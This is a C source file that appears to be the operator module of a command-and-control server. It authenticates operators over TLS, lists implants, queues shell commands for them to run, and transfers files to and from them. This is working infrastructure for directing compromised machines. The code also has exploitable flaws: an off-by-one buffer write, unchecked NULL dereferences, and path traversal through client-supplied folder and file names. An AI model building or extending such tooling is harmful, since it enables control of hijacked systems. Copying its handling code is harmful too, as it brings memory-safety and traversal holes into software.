#include "operator.h"

#include <pthread.h>
#include <cjson/cJSON.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>

#include <openssl/evp.h>
#include <openssl/x509v3.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/x509.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <openssl/param_build.h>
#include <openssl/core_names.h> 
#include <openssl/sslerr.h>


#include "db.h"
#include "logs.h"
#include "common.h"




char USERNAME[0x100];

int autheticate(MYSQL *con, SSL *ssl) {
    char auth[1024];
    int bytes_received = SSL_read(ssl, auth, sizeof(auth));
    if (bytes_received <= 0) {
        log_message(LOG_ERROR, "Failed to recieve authentication data from operator" );
        return -1;
    }
    auth[bytes_received] = '\0'; 
    cJSON *creds = cJSON_Parse(auth);

    if (creds == NULL) {
        //fprintf(stderr, "Failed to parse JSON: %s\n", auth);
        log_message(LOG_WARN, "Failed to parse JSON from Operator (Authenticating): %s", auth);
        cJSON_Delete(creds);
        return -1;
    }

    cJSON *username = cJSON_GetObjectItem(creds, "username");
    
    if (username == NULL || !cJSON_IsString(username)) {
        //fprintf(stderr, "Missing or invalid 'Username' field in JSON\n");
        log_message(LOG_WARN, "Missing or invalid 'Username' field in JSON\n");
        cJSON_Delete(creds);
        return -1;
    }
    cJSON *password = cJSON_GetObjectItem(creds, "password");
    if (password == NULL || !cJSON_IsString(password)) {
        //printf(stderr, "Missing or invalid 'Password' field in JSON\n");
        log_message(LOG_WARN, "Missing or invalid 'Password' field in JSON");
        cJSON_Delete(creds);
        return -1;
    }

    cJSON *reply = cJSON_CreateObject();
    if (reply == NULL) {
        //fprintf(stderr, "Failed to create cJSON object\n");
        log_message(LOG_WARN, "Failed to create cJSON object");
        cJSON_Delete(creds);
        // Handle error or exit
        return -1;
    }

    if (authenticate_operator(con, username->valuestring, password->valuestring) != 0) {
        cJSON_AddStringToObject(reply, "authenticated", "false");
        char *reply_ = cJSON_Print(reply);
        //send(sock, reply_, strlen(reply_), 0);
        SSL_write(ssl, reply_, strlen(reply_));
        log_message(LOG_WARN, "Operator failed to authenticate");
        free(reply_);
        free(reply);
        cJSON_Delete(creds);
        return -1;
        
    }
    cJSON_AddStringToObject(reply, "authenticated", "true");
    char *reply_ = cJSON_Print(reply);
    //send(sock, reply_, strlen(reply_), 0);
    SSL_write(ssl, reply_, strlen(reply_));
    strncpy(USERNAME, username->valuestring, sizeof(USERNAME) -1);
    USERNAME[sizeof(USERNAME) - 1] = '\0';
    log_message(LOG_INFO, "Operator [%s] authenticated successfully",USERNAME);
    free(reply_);
    free(reply);

    cJSON_Delete(creds);
    return 0;
}

char *verify_id(MYSQL *con, char *id) {
    cJSON *valid_id = cJSON_CreateObject();
            
    if (check_implant_id(con, id) == 0) {
        cJSON_AddStringToObject(valid_id, "valid_id", "false");
        char *reply = cJSON_Print(valid_id);
        cJSON_Delete(valid_id);
        log_message(LOG_INFO, "Requested Implant ID %s does not exists",id);
        return reply;
    } else {
        cJSON_AddStringToObject(valid_id, "valid_id", "true");
        char *reply = cJSON_Print(valid_id);
        cJSON_Delete(valid_id);
        log_message(LOG_WARN, "Requested Implant ID %s does exists",id);
        return reply;
    }
}

char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
    
    if (!rinfo) {
        return strdup("{\"error\": \"Invalid JSON\"}");
    }

    cJSON *implant_id = cJSON_GetObjectItem(rinfo, "implant_id");
    if (!implant_id) {
        return NULL;
    }
    char *implant_id_value = implant_id->valuestring;
    

    cJSON *action = cJSON_GetObjectItem(rinfo, "action");

    if (!action || !cJSON_IsString(action) || !implant_id || !cJSON_IsString(implant_id)) {
        return strdup("{\"error\": \"Missing or invalid action/implant_id\"}");
    }

    const char *action_value = action->valuestring;


    char *data = malloc(MAX_INFO);
    if (!data) return strdup("{\"error\": \"Memory allocation failed\"}");

    if (strcmp(action_value, "list-tasks") == 0) {
        snprintf(data, MAX_INFO, "%s", tasks_per_implant(con, implant_id_value));
    }  else if (strcmp(action_value, "response-task") == 0) {
        cJSON *task = cJSON_GetObjectItem(rinfo, "task_id");
        if (!task || !cJSON_IsNumber(task)) {
            free(data);
            return strdup("{\"error\": \"Invalid task_id\"}");
        }
        char *data_t = cmd_and_response(con, task->valueint);
        snprintf(data, MAX_INFO, "%s", data_t);
        free(data_t);
        // send the data
        //
    } 
    else if (strcmp(action_value, "new-task") == 0) {
        cJSON *command = cJSON_GetObjectItem(rinfo, "command");
        if (!command || !cJSON_IsString(command)) {
            free(data);
            return strdup("{\"error\": \"Invalid command\"}");
        }
        new_tasks(con, implant_id_value, command->valuestring);
        free(data);
        cJSON *tasks_added = cJSON_CreateObject();
        cJSON_AddStringToObject(tasks_added, "status", "task_added");
        data = cJSON_Print(tasks_added);
        cJSON_Delete(tasks_added);
    } else if (strcmp(action_value, "update-task") == 0) {
        cJSON *command = cJSON_GetObjectItem(rinfo, "command");
        if (!command || !cJSON_IsString(command)) {
            free(data);
            return strdup("{\"error\": \"Invalid command\"}");
        }
        cJSON *task_id = cJSON_GetObjectItem(rinfo, "task_id");
        if (!task_id || !cJSON_IsNumber(task_id)) {
            free(data);
            return strdup("{\"error\": \"Invalid Task Id\"}");
        }   
        if (!update_task(con, task_id->valueint, command->valuestring)) {
            free(data);
            return strdup("{\"update\": \"false\"}");
        } 
        return strdup("{\"update\": \"true\"}");
    } else {
        free(data);
        return strdup("{\"error\": \"Invalid action\"}");
    }

    return data;
}


void *operator_handler(void *Args) {
    struct operator_handler_args_t *args = (struct operator_handler_args_t*)Args;
    SSL *ssl = args->ssl;


    MYSQL *con = get_db_connection();

    if (con == NULL) {
        log_message(LOG_ERROR, "Failed to get DB connection from pool");
        return NULL;
    }

    // Check if connection is still alive
    if (mysql_ping(con) != 0) {
        log_message(LOG_WARN, "DB connection lost, reconnecting...");
        return NULL;
    }
    // 3 tries
    int try = 1;
    do {
        if (autheticate(con, ssl) == 0) {
            goto START;
        } 
        try++;
    } while (try <= 3);


    return NULL;
    
    
    // operator requesting infomartion or add new tasks
    START:
    while (1) {
        char buffer[1024];
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1); // recv(sock, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) {
            //perror("recv failed");
            log_message(LOG_ERROR, "Failed to receive data from operator");
            return NULL;
        }

        buffer[bytes_received] = '\0'; 
        cJSON *requested_info = cJSON_Parse(buffer);
        if (requested_info == NULL) {
            //fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
            log_message(LOG_ERROR, "Failed to parse JSON [Operator Handler]: %s", buffer);
            return NULL;
        }

        cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
        if (about == NULL || !cJSON_IsString(about) || about->valuestring == NULL) {
            //fprintf(stderr, "Missing or invalid 'Info' field in JSON\n");
            log_message(LOG_ERROR, "Missing or Invalid 'Info' field in the JSON [Operator Handler]");
            cJSON_Delete(requested_info);
            return NULL;
        }

        if (strncmp(about->valuestring, "Implants", 8) == 0){ // all info about implants
            char *implants = GetData(con, "Implants");
            //send(sock, agents, strlen(agents), 0);
            if (implants == NULL) {
                // handle this
                continue;
                }
            // make sure that json is fine
            cJSON *re = cJSON_Parse(implants);
            if (!re) {
                log_message(LOG_ERROR, "Invalid JSON FROM Implants database");
            }
            SSL_write(ssl, implants, strlen(implants));
            free(implants);
        } else if (strcmp(about->valuestring, "Tasks") == 0) {
            char *tasks = GetData(con, "Tasks");
            if (tasks == NULL) {
                continue;
            }
            SSL_write(ssl, tasks, strlen(tasks));
            free(tasks);
        } else if (strcmp(about->valuestring, "implant_id") == 0) {
            char *data = interact_with_implant(con, requested_info);
            if (data == NULL) {
                //send(sock, "ERROR", strlen("ERROR"), 0);
                //SSL_write(ssl, reply_, sizeof("ERROR"));    
                continue;
            }
            //send(sock, data, strlen(data), 0);
            SSL_write(ssl, data, strlen(data));
            free(data);
        } else if (strncmp(about->valuestring, "exit", 4) == 0 ) {
            log_message(LOG_INFO, "Operator [%s] Exiting", USERNAME);
            return NULL;
        } else if (strncmp(about->valuestring, "verify_implant", sizeof("verify_implant")) == 0) {
            cJSON *implant_id = cJSON_GetObjectItem(requested_info, "implant_id");
           
            char *is_valid = verify_id(con, implant_id->valuestring);
            if (is_valid == NULL) {
                log_message(LOG_WARN, "IS vallid is null");
                continue;
            }            
            SSL_write(ssl, is_valid, strlen(is_valid));
            free(is_valid);
        } else if (strcmp(about->valuestring, "files") == 0) {
            cJSON *option = cJSON_GetObjectItem(requested_info, "option");
            if (strcmp(option->valuestring, "upload") == 0) {
                operator_file_download(ssl);
            } else if (strcmp(option->valuestring, "download") == 0) {
                operator_file_upload(ssl);
            } else if (strcmp(option->valuestring, "view") == 0) {
                cJSON *folder = cJSON_GetObjectItem(requested_info, "folder");
                if (!folder || !cJSON_IsString(folder)) {
                    log_message(LOG_ERROR, "Invalid Folder");
                    SSL_write(ssl, "INVALID REQUEST", 15);
                    continue;
                }
                char base_path[BUFFER_SIZE];
                snprintf(base_path, BUFFER_SIZE, "./uploads/%s", folder->valuestring);
                cJSON *list = list_files(base_path);
                if (!list) {
                    log_message(LOG_ERROR, "Failed To get data from list_files");
                    SSL_write(ssl, "NO DATA", 7);
                    continue;
                }
                char *arr = cJSON_Print(list);
                cJSON_Delete(list);
                SSL_write(ssl, arr, strlen(arr));
                free(arr);
            }
        }
        cJSON_Delete(requested_info);
    } 
    log_message(LOG_INFO, "Closed connection");
    SSL_free(ssl);

    return NULL;
}

int operator_file_download(SSL *ssl) {
    // check if folder exists
    if (check_if_dir_exists("./uploads/operator/") == false) {
        if (create_dir("./uploads/operator") == false) {
            return -1;
        }
    }
    char filename[BUFFER_SIZE];
    SSL_read(ssl, filename, sizeof(filename) -1);
    cJSON *get_filename = cJSON_Parse(filename);
    if (!get_filename) {
        log_message(LOG_ERROR, "Failed to ");
        return -1;
    }

    cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
    //memset(filename, 0, sizeof(filename));
    strncpy(filename, name->valuestring, sizeof(filename)-1);
    log_message(LOG_INFO, "Receiving file with name : %s", filename);
    cJSON_Delete(get_filename);

    char *contents = (char*)malloc(MAX_INFO);
    char filepath[BUFFER_SIZE + 32]; // = "./uploads_operator";
    
    
    snprintf(filepath, sizeof(filepath), "./uploads/operator/%s", filename);

    int fd = open(filepath, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if (fd == -1) {
        log_message(LOG_ERROR, "Failed to create file descriptor for : %s", filepath);
        return -1;
    }

    log_message(LOG_INFO, "Writing to file : %s ", filepath);
    size_t bytesRead;
    size_t filesize;
    SSL_read(ssl, &filesize, sizeof(filesize));

    size_t received = 0;
    while (received < filesize) {
        bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
        write(fd, contents, bytesRead);
        received += bytesRead;
    }

    //while ((bytesRead = SSL_read(ssl, contents, FILE_CHUNK)) > 0) {
    //    write(fd, contents, bytesRead);
    //}
    log_message(LOG_INFO, "Wrote data to file : %s ", filepath);
    free(contents);
    return 0;
}

int operator_file_upload(SSL *ssl) {

    char filename[BUFFER_SIZE];
    SSL_read(ssl, filename, sizeof(filename) -1);
    cJSON *get_filename = cJSON_Parse(filename);
    if (!get_filename) {
        log_message(LOG_ERROR, "Failed to ");
        return -1;
    }
    cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
    strncpy(filename, name->valuestring, sizeof(filename)-1);
    cJSON *dir = cJSON_GetObjectItem(get_filename, "dir");
    
    char base_path[BUFFER_SIZE];
    snprintf(base_path, BUFFER_SIZE, "./uploads/%s", dir->valuestring);

    char filepath[BUFFER_SIZE * 2];
    snprintf(filepath, sizeof(filepath), "%s/%s", base_path, filename);


    char *contents = (char*)malloc(MAX_INFO);
    if (contents == NULL) {
        log_message(LOG_ERROR, "[Upload File] failed to allocate memory");
        return -1;
    }

    int fd = open(filepath, O_RDONLY);
    if (fd == -1) {
        log_message(LOG_ERROR, "[Upload file] Failed to open file descriptor for : %s", filepath);
        return -1;
    }

    

    cJSON *dir_exists = cJSON_CreateObject();
    char *filepath_ = search_file(base_path, filename);
    if (filepath_ == NULL) {
        cJSON_AddBoolToObject(dir_exists, "Exist", false);
        char *exists = cJSON_Print(dir_exists);
        cJSON_Delete(dir_exists);
        SSL_write(ssl, exists, strlen(exists));
        free(exists);
        //log_message(LOG_ERROR, "File Does Not Exist filename - %s", filename);
        return -1;
    }
    cJSON_AddBoolToObject(dir_exists, "Exist", true);

    char *exists = cJSON_Print(dir_exists);
    cJSON_Delete(dir_exists);
    SSL_write(ssl, exists, strlen(exists));
    free(exists);
    
    log_message(LOG_INFO, "Uploading %s", filename);

    // send file size
    struct stat st;
    fstat(fd, &st);
    size_t filesize = st.st_size;
    SSL_write(ssl, &filesize, sizeof(filesize));
    size_t bytesRead;
    while ((bytesRead = read(fd, contents, FILE_CHUNK)) > 0) {
        SSL_write(ssl, contents, bytesRead);
    }
    
    log_message(LOG_INFO, "Upload Completed");
    free(contents);
    return 0;
}